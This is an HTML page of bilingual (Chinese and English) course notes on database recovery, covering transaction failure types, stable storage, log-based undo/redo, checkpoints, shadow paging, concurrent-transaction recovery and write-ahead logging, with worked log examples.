<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 6526 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 28 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 7 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 23 分钟</p>
</div>
<h2 id="note-db-recovery-failure-classification">Failure Classification<a class="headerlink" href="#note-db-recovery-failure-classification" title="Permanent link">&para;</a></h2>
<h3 id="note-db-recovery-transaction-failure">Transaction Failure<a class="headerlink" href="#note-db-recovery-transaction-failure" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><strong>Logical Errors</strong>: Transaction cannot complete due to internal error conditions</p>
<ul>
<li>Overflow</li>
<li>Bad input</li>
<li>Data not found</li>
<li>etc.</li>
</ul>
</li>
<li>
<p><strong>System Errors</strong>: Database system must terminate an active transaction due to error conditions</p>
</li>
<li>Example: Deadlock</li>
</ul>
<h3 id="note-db-recovery-system-crash">System Crash<a class="headerlink" href="#note-db-recovery-system-crash" title="Permanent link">&para;</a></h3>
<ul>
<li>Power failure or other hardware/software failures causing system crash</li>
<li><strong>Fail-stop Assumption</strong>: Non-volatile storage contents are assumed to not be corrupted by system crash</li>
<li>Database systems implement numerous integrity checks to prevent disk data corruption</li>
</ul>
<h3 id="note-db-recovery-disk-failure">Disk Failure<a class="headerlink" href="#note-db-recovery-disk-failure" title="Permanent link">&para;</a></h3>
<ul>
<li>Head crash or similar disk failure destroying all or part of disk storage</li>
<li><strong>Destruction Assumption</strong>: Failures are assumed to be detectable</li>
<li>Disk drives use checksums to detect failures</li>
</ul>
<div class="admonition info">
<p class="admonition-title">Recovery Algorithms</p>
<p>Consider transaction Ti that transfers $50 from account A to account B</p>
<blockquote>
<p>Two updates: subtract 50 from A and add 50 to B </p>
</blockquote>
<p>Transaction Ti requires updates to A and B to be output to the database. </p>
<p>A failure may occur after one of these modifications have been made but before both of them are made. </p>
<p>Modifying the database without ensuring that the transaction will commit may leave the database in an inconsistent state</p>
<p>Not modifying the database may result in lost updates if failure occurs just after transaction commits</p>
<p>Recovery algorithms have two parts</p>
<ol>
<li>Actions taken during normal transaction processing to ensure enough information exists to recover from failures</li>
<li>Actions taken after a failure to recover the database contents to a state that ensures atomicity, consistency and durability</li>
</ol>
</div>
<h2 id="note-db-recovery-storage-structure">Storage Structure<a class="headerlink" href="#note-db-recovery-storage-structure" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>Volatile storage:</p>
<ul>
<li>Does not survive system crashes</li>
<li>Examples: main memory, cache memory</li>
</ul>
</li>
<li>
<p>Nonvolatile storage:</p>
<ul>
<li>Survives system crashes</li>
<li>Examples: disk, tape, flash memory, 
    non-volatile (battery backed up) RAM </li>
<li>But may still fail, losing data</li>
</ul>
</li>
<li>
<p>Stable storage:</p>
<ul>
<li>A mythical form of storage that survives all failures</li>
<li>Approximated by maintaining multiple copies on distinct nonvolatile media</li>
</ul>
</li>
</ul>
<h3 id="note-db-recovery-stable-storage-implementation">Stable-Storage Implementation<a class="headerlink" href="#note-db-recovery-stable-storage-implementation" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>在多个独立的非易失性存储介质上维护每个块的多个副本</p>
</li>
<li>
<p>副本可以存放在远程站点，以防止火灾或洪水等灾难</p>
</li>
<li>
<p>数据传输过程中的故障仍可能导致副本不一致：</p>
<ul>
<li>块传输可能导致：<ul>
<li>成功完成</li>
<li>部分失败：目标块包含错误信息</li>
<li>完全失败：目标块从未更新</li>
</ul>
</li>
</ul>
</li>
<li>
<p>保护存储介质在数据传输过程中免受故障（一种解决方案）：</p>
<ul>
<li>按以下方式执行输出操作（假设每个块有两个副本）：<ol>
<li>将信息写入第一个物理块</li>
<li>当第一次写入成功完成后，将相同的信息写入第二个物理块</li>
<li>只有在第二次写入成功完成后，输出操作才算完成</li>
</ol>
</li>
</ul>
</li>
<li>
<p>由于输出操作期间的故障，块的副本可能不同。要从中恢复：</p>
</li>
<li>
<p>首先找到不一致的块：</p>
<ul>
<li>昂贵方案：比较每个磁盘块的两个副本</li>
<li>更好的方案：<ul>
<li>在非易失性存储上记录正在进行的磁盘写入（非易失性RAM或磁盘的特殊区域）</li>
<li>在恢复期间使用此信息查找可能不一致的块，并仅比较这些块的副本</li>
<li>在硬件RAID系统中使用</li>
</ul>
</li>
</ul>
</li>
<li>
<p>如果检测到不一致块的两个副本中的任何一个有错误（错误的校验和），则用另一个副本覆盖它</p>
</li>
<li>如果两个副本都没有错误但不同，则用第一个块覆盖第二个块</li>
</ul>
<h3 id="note-db-recovery-data-access">Data Access<a class="headerlink" href="#note-db-recovery-data-access" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>物理块(Physical blocks):</p>
<ul>
<li>存储在磁盘上的块</li>
<li>通过input(B)操作将物理块B传输到主内存</li>
<li>通过output(B)操作将缓冲区块B传输到磁盘,并替换相应的物理块</li>
</ul>
</li>
<li>
<p>缓冲区块(Buffer blocks):</p>
<ul>
<li>临时存储在主内存中的块</li>
<li>用于提高数据访问效率</li>
</ul>
</li>
<li>
<p>数据项(Data items):</p>
<ul>
<li>为简化起见,假设每个数据项都能放入单个块中</li>
<li>存储在单个块内部</li>
</ul>
</li>
<li>
<p>块传输操作:</p>
<ul>
<li>input(B): 将物理块B传输到主内存</li>
<li>output(B): 将缓冲区块B传输到磁盘</li>
</ul>
</li>
</ul>
<h3 id="note-db-recovery-transaction-operations">Transaction Operations<a class="headerlink" href="#note-db-recovery-transaction-operations" title="Permanent link">&para;</a></h3>
<ul>
<li>每个事务Ti都有其私有的工作区，用于保存它访问和更新的所有数据项的本地副本</li>
<li>
<p>Ti的数据项X的本地副本称为xi</p>
</li>
<li>
<p>在系统缓冲区块和事务私有工作区之间传输数据项的操作：</p>
<ul>
<li>read(X)：将数据项X的值赋给局部变量xi</li>
<li>write(X)：将局部变量xi的值赋给缓冲区块中的数据项X</li>
<li>注意：output(BX)不必立即跟随write(X)。系统可以在认为合适的时候执行输出操作</li>
</ul>
</li>
<li>
<p>事务必须：</p>
<ul>
<li>在首次访问X之前执行read(X)（后续读取可以从本地副本进行）</li>
<li>write(X)可以在事务提交之前的任何时间执行</li>
</ul>
</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/data_access.png" width="500" />

<figcaption>
Example of Data Access
</figcaption>
</figure>
<h2 id="note-db-recovery-log-based-recovery">Log-Based Recovery<a class="headerlink" href="#note-db-recovery-log-based-recovery" title="Permanent link">&para;</a></h2>
<h3 id="note-db-recovery-log-records">Log Records<a class="headerlink" href="#note-db-recovery-log-records" title="Permanent link">&para;</a></h3>
<ul>
<li>日志记录在稳定存储上维护</li>
<li>日志是一系列日志记录，记录了数据库上的更新活动</li>
<li>日志记录类型：<ul>
<li><code>&lt;Ti start&gt;</code>: 事务Ti开始时写入</li>
<li><code>&lt;Ti, X, V1, V2&gt;</code>: 事务Ti执行write(X)前写入<ul>
<li>V1: X的旧值</li>
<li>V2: 要写入X的新值</li>
</ul>
</li>
<li><code>&lt;Ti commit&gt;</code>: 事务Ti完成最后一条语句时写入</li>
</ul>
</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-db-recovery-__codelineno-0-1"></a>   &lt;T1 start&gt;
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-db-recovery-__codelineno-0-2"></a>   &lt;T1, A, 100, 200&gt;
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-db-recovery-__codelineno-0-3"></a>   &lt;T2 start&gt;
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-db-recovery-__codelineno-0-4"></a>   &lt;T2, B, 300, 400&gt;
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-db-recovery-__codelineno-0-5"></a>   &lt;T3 start&gt;
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-db-recovery-__codelineno-0-6"></a>   &lt;T1, C, 500, 600&gt;
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-db-recovery-__codelineno-0-7"></a>   &lt;T1 commit&gt;
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-db-recovery-__codelineno-0-8"></a>   &lt;T3, C, 600, 700&gt;
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-db-recovery-__codelineno-0-9"></a>   &lt;T3, C, 700, 800&gt;
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-db-recovery-__codelineno-0-10"></a>    &lt;T3 commit&gt;
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-db-recovery-__codelineno-0-11"></a>    &lt;T2, C, 800, 900&gt;
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#note-db-recovery-__codelineno-0-12"></a>    &lt;T2, B, 400, 500&gt;
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#note-db-recovery-__codelineno-0-13"></a>...
</span></code></pre></div>
<ol>
<li>
<p>延迟数据库修改(Deferred Database Modification)</p>
<ul>
<li>事务执行期间不修改数据库</li>
<li>所有修改都记录在日志中</li>
<li>事务提交时才将修改写入数据库</li>
<li>优点：恢复简单，只需重做已提交事务</li>
<li>缺点：需要大量日志空间</li>
</ul>
</li>
<li>
<p>立即数据库修改(Immediate Database Modification)</p>
<ul>
<li>事务执行期间直接修改数据库（buffer或者disk）</li>
<li>同时记录日志</li>
<li>需要同时支持重做(redo)和撤销(undo)操作</li>
<li>优点：减少日志空间需求</li>
<li>缺点：恢复过程较复杂</li>
</ul>
</li>
</ol>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>立即修改方案允许在事务提交前将未提交事务的更新写入缓冲区或磁盘本身。更新日志记录必须在数据库项写入前完成记录。我们假定日志记录直接输出到稳定存储。更新后的数据块输出到稳定存储可发生于事务提交前后的任意时刻，且数据块输出顺序与其写入顺序可以不同。</p>
</div>
<figure>
<img alt="" src="../NOTE/DB/img/deffered.png" width="500" />

<figcaption>
Example of Deferred Database Modification
</figcaption>
</figure>
<p>如果崩溃时稳定存储上的日志是以下情况：</p>
<p>a): 不需要redo</p>
<p>b): 需要redo，T0需要redo，T1不需要redo</p>
<p>c): 需要redo，T0和T1都需要redo</p>
<figure>
<img alt="" src="../NOTE/DB/img/recovery.png" width="500" />

<figcaption>
Example of immediate database modification
</figcaption>
</figure>
<div class="admonition info">
<p class="admonition-title">immediate database modification</p>
<p>恢复流程包含两个操作而非一个：</p>
<ul>
<li><code>undo(Ti)</code>: 将Ti事务更新的所有数据项恢复为旧值，从Ti的最后一个日志记录开始逆向处理</li>
<li><code>redo(Ti)</code>: 将Ti事务更新的所有数据项设置为新值，从Ti的第一个日志记录开始正向处理</li>
</ul>
<p>这两个操作都必须满足幂等性。也就是说，即使操作被执行多次，效果与执行一次相同。这一特性是必需的，因为在恢复过程中
操作可能会被重复执行。</p>
<p>故障恢复时的处理规则：</p>
<ul>
<li>当日志包含<code>&lt;Ti start&gt;</code>记录但未包含<code>&lt;Ti commit&gt;</code>记录时，需要对事务Ti执行撤销操作</li>
<li>当日志同时包含<code>&lt;Ti start&gt;</code>和<code>&lt;Ti commit&gt;</code>记录时，需要对事务Ti执行重做操作</li>
<li>恢复时先执行所有<code>undo</code>操作，再执行所有<code>redo</code>操作</li>
</ul>
</div>
<figure>
<img alt="" src="../NOTE/DB/img/recovery_example.png" width="500" />

<figcaption>
Example of Recovery
</figcaption>
</figure>
<p>在以下几种情况中恢复</p>
<p>a): undo T0,将B的值恢复为2000，A的值恢复为1000；</p>
<p>b): redo T0，undo T1：将C的值恢复为700，将A和B的值分别设置为950和2050（先执行undo，再执行redo）。日志记录<T1, C, 700>和<T1, abort>被写出。</p>
<p>c): redo T0，redo T1：将A和B的值分别设置为950和2050，然后将C的值设置为600。</p>
<h3 id="note-db-recovery-checkpoints">Checkpoints<a class="headerlink" href="#note-db-recovery-checkpoints" title="Permanent link">&para;</a></h3>
<p>Redo/undo 操作是非常慢的：</p>
<ul>
<li>Processing the entire log is time-consuming if the system has run for a long time</li>
<li>We might unnecessarily redo transactions which have already output their updates to the database. </li>
</ul>
<p>Streamline recovery procedure by periodically performing checkpointing </p>
<ul>
<li>Output all log records currently residing in main memory onto stable storage.</li>
<li>Output all modified buffer blocks to the disk.</li>
<li>Write a log record <code>&lt; checkpoint L&gt;</code> onto stable storage where L is a list of all transactions active at the time of checkpoint.</li>
<li>All updates are stopped while doing checkpointing</li>
</ul>
<p>通过定期检查点操作来简化恢复流程。</p>
<p>在恢复过程中，我们只需考虑checkpoint前最近启动的事务Ti，以及Ti之后启动的事务。从日志末尾反向扫描，找到最近的<code>&lt;checkpoint L&gt;</code>记录。只有L列表中或checkpoint后启动的事务需要重做或撤销。在checkpoint前已提交或中止的事务，其所有更新均已输出到稳定存储中。可能需要日志的较早部分用于撤销操作。继续反向扫描，直到为L列表中的每个事务Ti找到对应的<code>&lt;Ti start&gt;</code>记录。上述最早<code>&lt;Ti start&gt;</code>记录之前的日志部分在恢复时无需使用，可随时清除。</p>
<figure>
<img alt="" src="../NOTE/DB/img/checkpoint.png" width="500" />

<figcaption>
Example of Checkpoint
</figcaption>
</figure>
<p>T1可以被忽略，因为T1在checkpoint之前已经提交，其所有更新已经输出到稳定存储中。</p>
<p>T2和T3需要被重做，因为它们在checkpoint之后启动。</p>
<p>T4需要被撤销，因为它是中止的。</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>假设我们有以下日志记录序列：</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-db-recovery-__codelineno-1-1"></a>&lt;T1 start&gt;
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-db-recovery-__codelineno-1-2"></a>&lt;T1, A, 100, 200&gt;
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-db-recovery-__codelineno-1-3"></a>&lt;T1 commit&gt;
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-db-recovery-__codelineno-1-4"></a>&lt;T2 start&gt;
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-db-recovery-__codelineno-1-5"></a>&lt;T2, B, 300, 400&gt;
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-db-recovery-__codelineno-1-6"></a>&lt;checkpoint {T2}&gt;
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#note-db-recovery-__codelineno-1-7"></a>&lt;T3 start&gt;
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#note-db-recovery-__codelineno-1-8"></a>&lt;T3, C, 500, 600&gt;
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#note-db-recovery-__codelineno-1-9"></a>&lt;T2, D, 700, 800&gt;
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#note-db-recovery-__codelineno-1-10"></a>&lt;T2 commit&gt;
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#note-db-recovery-__codelineno-1-11"></a>&lt;T3, E, 900, 1000&gt;
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#note-db-recovery-__codelineno-1-12"></a>系统崩溃
</span></code></pre></div>
<ul>
<li>
<p>首先从日志末尾反向扫描，找到最近的检查点记录：<code>&lt;checkpoint {T2}&gt;</code></p>
</li>
<li>
<p>根据检查点记录，我们知道：</p>
<ul>
<li>T1 在检查点之前已经提交，其所有更新已经写入稳定存储，不需要处理</li>
<li>T2 在检查点时是活动事务，需要处理</li>
<li>T3 在检查点之后启动，需要处理</li>
</ul>
</li>
<li>
<p>继续反向扫描，找到 T2 和 T3 的 start 记录</p>
</li>
<li>
<p>恢复处理：</p>
<ul>
<li>T2 需要重做(redo)，因为它在检查点后提交了</li>
<li>T3 需要撤销(undo)，因为它在系统崩溃时还未提交</li>
</ul>
</li>
<li>
<p>具体操作：</p>
<ul>
<li>重做 T2 的更新：<ul>
<li>将 B 的值设为 400</li>
<li>将 D 的值设为 800</li>
</ul>
</li>
</ul>
</li>
<li>
<p>撤销 T3 的更新：</p>
<ul>
<li>将 C 的值恢复为 500</li>
<li>将 E 的值恢复为 900</li>
</ul>
</li>
<li>
<p>检查点之前的日志记录（T1 相关的记录）可以安全清除，因为：</p>
<ul>
<li>T1 已经提交</li>
<li>所有更新都已写入稳定存储</li>
<li>这些记录对恢复过程没有帮助</li>
</ul>
</li>
</ul>
</div>
<h2 id="note-db-recovery-shadow-paging">Shadow Paging<a class="headerlink" href="#note-db-recovery-shadow-paging" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">Shadow Paging</p>
<p>Shadow paging is an alternative to log-based recovery;this scheme is useful if transactions execute serially </p>
<p><strong>Idea</strong>:maintain two page tables during the lifetime of a transaction 
–the current page table, and the shadow page table </p>
</div>
<p>Store the shadow page table in nonvolatile storage, 
such that state of the database prior to transaction execution may be recovered. </p>
<p>Shadow page table is never modified during execution</p>
<p>To start with, both the page tables are identical. 
Only current page table is used for data item accesses during execution of the transaction.</p>
<p>Whenever any page is about to be written for the first time</p>
<ul>
<li>A copy of this page is made onto an unused page. </li>
<li>The current page table is then made to point to the copy</li>
<li>The update is performed on the copy</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/shadow_paging.png" width="500" />

<figcaption>
Example of Shadow Paging
</figcaption>
</figure>
<p>提交之前：</p>
<ol>
<li>将主内存中所有修改过的页面刷新到磁盘</li>
<li>将当前页表输出到磁盘</li>
<li>将当前页表设置为新的影子页表:<ul>
<li>在磁盘上的固定(已知)位置保存指向影子页表的指针</li>
<li>通过更新指针指向磁盘上的当前页表,使当前页表成为新的影子页表</li>
</ul>
</li>
</ol>
<p>一旦影子页表指针被写入,事务就提交完成。</p>
<p>崩溃后不需要恢复 - 新事务可以立即开始,使用影子页表。</p>
<p>不在当前/影子页表中指向的页面应该被释放(垃圾回收)。</p>
<div class="admonition summary">
<p class="admonition-title">Summary</p>
<p><strong>优点</strong>:</p>
<ul>
<li>不需要日志</li>
<li>恢复速度快</li>
<li>实现简单</li>
</ul>
<p><strong>缺点</strong>:</p>
<ul>
<li>数据碎片化</li>
<li>垃圾回收开销</li>
<li>并发事务处理复杂</li>
<li>不适合频繁更新的数据库</li>
</ul>
</div>
<h2 id="note-db-recovery-recovery-with-concurrent-transactions">Recovery With Concurrent Transactions<a class="headerlink" href="#note-db-recovery-recovery-with-concurrent-transactions" title="Permanent link">&para;</a></h2>
<blockquote>
<p>We modify the log-based recovery schemes to allow multiple transactions to execute concurrently.</p>
</blockquote>
<ul>
<li>所有事务共享一个磁盘缓冲区和日志文件。</li>
<li>一个缓冲块可能包含多个事务更新的数据项。</li>
<li>使用严格两阶段锁(Strict 2PL)进行并发控制：<ul>
<li>排他锁(X-lock)持有到事务结束。</li>
<li>未提交事务的更新对其他事务不可见。</li>
</ul>
</li>
<li>日志记录方式与之前相同。</li>
<li>不同事务的日志记录在日志文件中交错排列。</li>
</ul>
<h3 id="note-db-recovery-checkpoint">checkpoint<a class="headerlink" href="#note-db-recovery-checkpoint" title="Permanent link">&para;</a></h3>
<ul>
<li>检查点记录格式为 <code>&lt;checkpoint L&gt;</code>，其中 L 是在检查点时活跃的事务列表，例如 <code>{ T2, T4 }</code>。</li>
<li>假设在执行检查点时没有更新正在进行。</li>
</ul>
<h3 id="note-db-recovery-recovery_1">Recovery<a class="headerlink" href="#note-db-recovery-recovery_1" title="Permanent link">&para;</a></h3>
<ul>
<li>恢复时需要考虑多个事务同时活跃的情况。</li>
<li>检查点后，恢复操作需要从最近的检查点开始，并根据日志记录恢复各个事务的状态。</li>
</ul>
<div class="admonition info">
<p class="admonition-title">when the system recovers from a crash</p>
<ul>
<li>首先，初始化 undo-list 和 redo-list 为空</li>
<li>
<p>从尾至头扫描日志文件，直到找到第一个checkpoint，此时，对于每一个在这一过程中扫描到的事务，做以下事情</p>
<ul>
<li>如果扫描到的日志记录是 <code>&lt;Ti commit&gt;</code>，将Ti加入redo-list</li>
<li>如果扫描到的日志记录是 <code>&lt;Ti start&gt;</code>，将Ti加入undo-list,当然，前提是它不在redo-list中</li>
<li>如果扫描到的日志记录是 <code>&lt;Ti abort&gt;</code>，将Ti加入undo-list</li>
</ul>
</li>
<li>
<p>然后，对于在checkpoint中出现的每一个事务Ti，如果其不在redo-list中，则将Ti加入undo-list</p>
</li>
</ul>
<p>此刻，undo-list中包含所有需要撤销的事务，redo-list中包含所有需要重做的事务</p>
<p>然后，恢复过程继续执行：</p>
<ul>
<li>从日志文件末尾开始反向扫描，直到遇到undo-list中每个事务的<code>&lt;Ti start&gt;</code>记录为止。</li>
<li>在扫描过程中，对属于undo-list中事务的每条日志记录执行撤销操作。</li>
<li>找到最近的<code>&lt;checkpoint L&gt;</code>记录。</li>
<li>从<code>&lt;checkpoint L&gt;</code>记录开始向前扫描日志，直到日志末尾。</li>
<li>在扫描过程中，对属于redo-list中事务的每条日志记录执行重做操作。</li>
</ul>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>假设我们有以下日志记录序列：</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-db-recovery-__codelineno-2-1"></a>&lt;T0 start&gt;
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-db-recovery-__codelineno-2-2"></a>&lt;checkpoint {T0} &gt;
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-db-recovery-__codelineno-2-3"></a>&lt;T0, A, 0, 10&gt;
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-db-recovery-__codelineno-2-4"></a>&lt;T0 commit&gt;
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-db-recovery-__codelineno-2-5"></a>&lt;T1 start&gt;
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#note-db-recovery-__codelineno-2-6"></a>&lt;T1, A, 10, 15&gt;
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#note-db-recovery-__codelineno-2-7"></a>&lt;T2 start&gt;                   ——————
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#note-db-recovery-__codelineno-2-8"></a>&lt;T2, C, 0, 10&gt;                 |  
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#note-db-recovery-__codelineno-2-9"></a>&lt;T2, B, 10, 20&gt;                |
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#note-db-recovery-__codelineno-2-10"></a>&lt;checkpoint {T1, T2 } &gt; ____   |    ————————
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#note-db-recovery-__codelineno-2-11"></a>&lt;T3 start&gt;               |     |       |
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#note-db-recovery-__codelineno-2-12"></a>&lt;T1 commit&gt;              |     |       |
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#note-db-recovery-__codelineno-2-13"></a>&lt;T3, A, 15, 20&gt;          |     |       |
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#note-db-recovery-__codelineno-2-14"></a>&lt;T3, D, 0, 10&gt;           |     |       |
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#note-db-recovery-__codelineno-2-15"></a>&lt;T3 commit&gt;              |     |       |
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#note-db-recovery-__codelineno-2-16"></a>- - -Crashed- - -       step1 step2-1 step2-2
</span></code></pre></div>
<ol>
<li>初始化 undo-list {}, redo-list {}</li>
<li>从尾至头扫描日志文件，直到找到第一个checkpoint <code>&lt;checkpoint {T1,T2} &gt;</code>，此时，undo-list = {T2}, redo-list = {T1,T3}</li>
</ol>
<p>开始恢复</p>
<ol>
<li>从尾至头扫描日志文件，直到找到所有在undo-list中的事务的<code>&lt;Ti start&gt;</code>记录为止,在这里停在<code>&lt;T2 start&gt;</code>,撤销T2</li>
<li>从<code>&lt;checkpoint {T1,T2} &gt;</code>开始向前扫描日志，直到日志末尾。</li>
<li>对redo-list中的事务执行重做操作，重做T1和T3</li>
</ol>
</div>
<h2 id="note-db-recovery-buffer-management">Buffer Management<a class="headerlink" href="#note-db-recovery-buffer-management" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>通常，输出到稳定存储的单位是块，而日志记录通常比块小得多。</p>
</li>
<li>
<p>因此，日志记录会缓存在主存中，而不是直接输出到稳定存储。</p>
</li>
<li>
<p>日志记录会在以下情况下输出到稳定存储：</p>
<ol>
<li>缓冲区中的日志记录块已满，</li>
<li>或者执行了强制日志操作。<ul>
<li>例如，发生检查点时。</li>
</ul>
</li>
</ol>
</li>
<li>
<p>强制日志（log force）用于通过将所有日志记录（包括提交记录<code>&lt;Ti commit&gt;</code>）强制输出到稳定存储来提交事务。</p>
</li>
<li>
<p>因此，可以通过单个输出操作输出多个日志记录，从而降低I/O成本。</p>
</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Write-Ahead Logging (WAL) 先写日志规则</p>
<ol>
<li>日志记录按照创建的顺序输出到稳定存储。</li>
<li>事务Ti只有在日志记录<code>&lt;Ti commit&gt;</code>已输出到稳定存储后，才进入提交状态。</li>
<li>在<code>&lt;Ti commit&gt;</code>可以输出到稳定存储之前，所有与Ti相关的日志记录必须已经输出到稳定存储。</li>
<li>在主存中的数据块输出到数据库之前，所有与该数据块相关的日志记录必须已经输出到稳定存储。（日志应先于数据写到磁盘）。 这一规则被称为先写日志规则（Write-Ahead Logging Rule, WAL）。
严格来说，WAL只要求撤销信息被输出</li>
</ol>
</div>
<p>数据库维护一个内存缓冲区，用于存储数据块。
当需要一个新的数据块时，如果缓冲区已满，则需要从缓冲区中移除一个现有的数据块。
如果被选择移除的数据块已被更新，则必须将其输出到磁盘。</p>
<p>恢复算法支持无强制策略，即在事务提交时，更新的数据块不需要被写入磁盘。
强制策略：要求在提交时将更新的数据块写入磁盘，这会导致提交操作更昂贵。</p>
<p>恢复算法支持抢占策略，即包含未提交事务更新的数据块可以在事务提交之前被写入磁盘。</p>
<ul>
<li>
<p>如果一个包含未提交更新的块被输出到磁盘，首先将更新的日志记录（包含撤销信息）输出到稳定存储的日志中（先写日志规则）。</p>
</li>
<li>
<p>在块被输出到磁盘时，不应有更新正在进行。可以通过以下方式确保：</p>
<ul>
<li>在写入数据项之前，事务获取包含该数据项的块的独占锁。</li>
<li>写入完成后可以释放锁。</li>
<li>这种短时间持有的锁称为闩锁(latch)。</li>
</ul>
</li>
<li>
<p>要将一个块输出到磁盘：</p>
<ol>
<li>首先获取该块的独占闩锁(exclusive latch)。<ul>
<li>确保没有更新正在该块上进行。</li>
</ul>
</li>
<li>然后执行日志刷新。</li>
<li>接着将块输出到磁盘。</li>
<li>最后释放该块的闩锁。</li>
</ol>
</li>
</ul>
<div class="admonition info">
